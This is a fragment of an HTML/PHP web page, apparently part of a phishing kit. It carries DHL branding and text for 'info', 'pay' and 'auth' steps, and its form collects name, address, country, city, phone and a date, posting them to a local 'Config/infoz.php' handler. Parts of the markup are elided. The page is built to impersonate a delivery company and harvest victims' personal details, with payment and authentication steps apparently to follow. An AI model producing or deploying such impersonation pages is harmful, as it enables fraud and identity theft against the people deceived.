...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
        ...
        <form method="POST" action="./Config/infoz.php">
        <div class="carda">

        <img style="width:140px;margin:10px 0 40px;" src="./styles/dhl-logo.png" alt="" srcset="">
       ...
       <div class="progtext">
        <p><?php echo lang('xBinfo'); ?></p>
        <p><?php echo lang('xBpay'); ?></p>
        <p><?php echo lang('xBauth'); ?></p>
       </div>

       <form method="post" action="./Config/infoz.php">

        <h4 style="margin-top: 30px;"><?php echo lang('xBh1t'); ?></h4>

        <input name="name" placeholder="<?php echo lang('xname'); ?>" class="inpt" maxlength="50" minlength="2" type="text" required="">

        <input name="address" placeholder="<?php echo lang('xaddress'); ?>" class="inpt" maxlength="50" minlength="2" type="text" required="">

        <input name="country" placeholder="<?php echo lang('xcountry'); ?>" class="inpt" maxlength="50" minlength="2" type="text" required="">

        <input name="city" placeholder="<?php echo lang('xcity'); ?>" class="inpt" maxlength="50" minlength="2" type="text" required="">

        <input name="phone" placeholder="<?php echo lang('xphone'); ?>" class="inpt" maxlength="13" minlength="2" type="tel" required="">

        <input name="date" placeholder="<?php echo lang('xdate'); ?>" class="date inpt" maxlength="10" minlength="2" type="tel" required="">
    ...
    <script src="./styles/js/cleave.js"></script>
    <script src="./styles/js/mainDate.js"></script>
</body>
